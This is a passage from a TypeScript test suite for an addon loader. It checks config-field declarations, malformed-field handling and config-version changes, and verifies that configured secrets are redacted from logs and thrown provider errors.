        freshness: "settled",
      }),
    },
  };
}
`;
  }

  function loadWith(config: AddonConfigStore, log?: (m: string) => void) {
    return loadPlugins({
      dir: pluginsDir,
      kv: store,
      config,
      log: log ?? ((m) => logs.push(m)),
      policy: { minIntervalMsPerHost: 0 },
    });
  }

  test("a declared field is readable through c.config, defaults and all", async () => {
    writePlugin("configured.ts", configuredPlugin("configured"));
    const config = new AddonConfigStore(store, {});

    const facets = await resolveWith(await loadWith(config));
    expect(facets.ratings?.data?.[0]?.source).toBe("unconfigured");
    // And the loader recorded what the addon asked for, which is what an admin form draws.
    expect(config.declarationOf("configured").map((f) => f.key)).toEqual(["apiKey", "source"]);
  });

  test("a stored value beats the env seed all the way through to what the addon answers", async () => {
    writePlugin("configured.ts", configuredPlugin("configured"));
    const config = new AddonConfigStore(store, { FIXTURE_SOURCE: "env-seeded" });
    config.write("configured", "source", "from-the-store");

    const facets = await resolveWith(await loadWith(config));
    expect(facets.ratings?.data?.[0]?.source).toBe("from-the-store");
  });

  test("a malformed field costs itself, and the addon still loads", async () => {
    writePlugin(
      "sloppy.ts",
      `
export const meta = {
  id: "sloppy",
  entities: ["movie"],
  config: [
    { key: "ok", type: "string", label: "Fine" },
    { key: "noLabel", type: "string" },
    { key: "weird", type: "colour", label: "Weird" },
    { key: "ok", type: "string", label: "Twice" },
  ],
};
export function init(c) {
  return {
    facets: {
      ratings: async () => ({
        data: [{ source: "sloppy", kind: "critics", value: 1, outOf: 100 }],
        freshness: "settled",
      }),
    },
  };
}
`,
    );
    const config = new AddonConfigStore(store, {});
    const registry = await loadWith(config);

    expect(registry.list().map((p) => p.meta.id)).toEqual(["sloppy"]);
    expect(config.declarationOf("sloppy").map((f) => f.key)).toEqual(["ok"]);
    expect(logs.join("\n")).toMatch(/config 'noLabel' has no label -- dropped/);
    expect(logs.join("\n")).toMatch(/config 'weird' has unknown type 'colour' -- dropped/);
    expect(logs.join("\n")).toMatch(/config key 'ok' is declared twice -- second dropped/);
  });

  test("the registry reports the fields that survived, not the ones the author wrote", async () => {
    writePlugin("configured.ts", configuredPlugin("configured"));
    const registry = await loadWith(new AddonConfigStore(store, {}));
    expect(registry.list()[0]?.config.map((f) => f.key)).toEqual(["apiKey", "source"]);
  });

  /*
    THE CACHE-INVALIDATION DECISION, asserted both ways.

    A config change invalidates that addon's cached contributions, because a different API
    key may buy different data -- but only at the next LOAD, never at the moment somebody
    saves. `configVersion` is where that lands, which is also what makes the timing right:
    `init` reads its configuration once, so "the version moves when the plugin is next
    loaded" is exactly when the new configuration starts being used. An admin form saving on
    every keystroke therefore costs nothing.
  */
  test("changing a config value moves the addon's configVersion", async () => {
    writePlugin("configured.ts", configuredPlugin("configured"));
    const config = new AddonConfigStore(store, {});

    const before = (await loadWith(config)).configVersionOf("configured");
    config.write("configured", "source", "somewhere-else");
    const after = (await loadWith(config)).configVersionOf("configured");

    expect(after).not.toBe(before);
  });

  test("re-saving the same value does not move it, so nothing is re-bought for free", async () => {
    writePlugin("configured.ts", configuredPlugin("configured"));
    const config = new AddonConfigStore(store, {});
    config.write("configured", "source", "same");

    const before = (await loadWith(config)).configVersionOf("configured");
    config.write("configured", "source", "same");
    const after = (await loadWith(config)).configVersionOf("configured");

    expect(after).toBe(before);
  });

  /**
   * A configured secret reaches no log line, and the case that matters is the THROWN one.
   *
   * An addon author can be told not to log their own key. They cannot be relied on to have
   * thought about `FacetResolver`, which prints `err.message` for every provider that
   * throws -- and an upstream client that builds its error out of a URL carrying `?api_key=`
   * puts a live credential in the container log with nobody having written a log call at
   * all. `safeUrl` closes that for the one client in this tree; redaction closes it for
   * every addon nobody has read.
   */
  test("a configured secret reaches no log line, not even through a thrown provider error", async () => {
    const KEY = "s3cret-key-value";
    writePlugin(
      "leaky.ts",
      `
export const meta = {
  id: "leaky",
  entities: ["movie"],
  config: [{ key: "apiKey", type: "secret", label: "API key", required: true }],
};
export function init(c) {
  const apiKey = c.config.string("apiKey");
  // Both routes out: a log line the author wrote, and an error they never meant to leak.
  c.log("starting with key " + apiKey);
  return {
    facets: {
      ratings: async () => {
        throw new Error("https://api.example/x?api_key=" + apiKey + " answered 401");
      },
    },
  };
}
`,
    );
    const config = new AddonConfigStore(store, {});
    config.declare("leaky", [{ key: "apiKey", type: "secret", label: "API key" }]);
    config.write("leaky", "apiKey", KEY);

    // The wiring `src/server/index.ts` uses: one redacting sink for the loader AND for the
    // resolver, because those are the two places an addon's own words are printed.
    const printed: string[] = [];
    const log = redactingLog(
      (m) => printed.push(m),
      () => config.secrets(),
    );
    const registry = await loadWith(config, log);
    const facets = await new FacetResolver({ store, registry, log }).resolve(INCEPTION, {
      deadlineMs: 2_000,
    });

    expect(printed.join("\n")).not.toContain(KEY);
    expect(printed.join("\n")).toContain(REDACTED);
    // The failure is still REPORTED -- redaction must not cost the operator the diagnosis.
    expect(printed.join("\n")).toMatch(/plugin leaky: 'ratings' failed/);

    // And nothing a browser can reach carries it either: the facet reports a status and no
    // message, and the cached row is the failure, not the reason for it.
    expect(JSON.stringify(facets)).not.toContain(KEY);
    expect(JSON.stringify(store.facetContributions("tt1375666"))).not.toContain(KEY);
  });
});
